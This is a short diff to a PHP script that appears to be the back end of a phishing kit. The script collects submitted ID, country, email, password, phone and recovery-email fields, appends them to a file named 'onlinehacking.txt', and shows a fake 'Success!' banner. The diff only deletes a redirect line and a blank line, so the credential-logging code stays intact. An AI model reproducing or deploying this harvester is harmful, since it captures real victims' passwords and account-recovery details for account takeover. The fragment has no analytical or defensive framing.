@@ -6,11 +6,9 @@ $password = $_POST['password'];
 $hp = $_POST['phone'];
 $emailr = $_POST['emailr'];
 ?>
-
 <?php
 
 file_put_contents("onlinehacking.txt", "[Id:] " . $id = $_POST['id'] . " [Country:] " . $country = $_POST['country'] . " [Email:] " . $email = $_POST['email'] . "[Password]" . $password = $_POST['password'] . "[Hp]" . $hp = $_POST['phone'] . "[Emailr]" . $emailr = $_POST['emailr'] . "\n", FILE_APPEND);
-header('Location: https://www.OnlineHacking.xyz');
 ?>
 
 <center><span style='background:limegreen;width:360px;margin:0;padding:5px 0;color:black;display:block'>Success! Your submission has been requested</span></center>
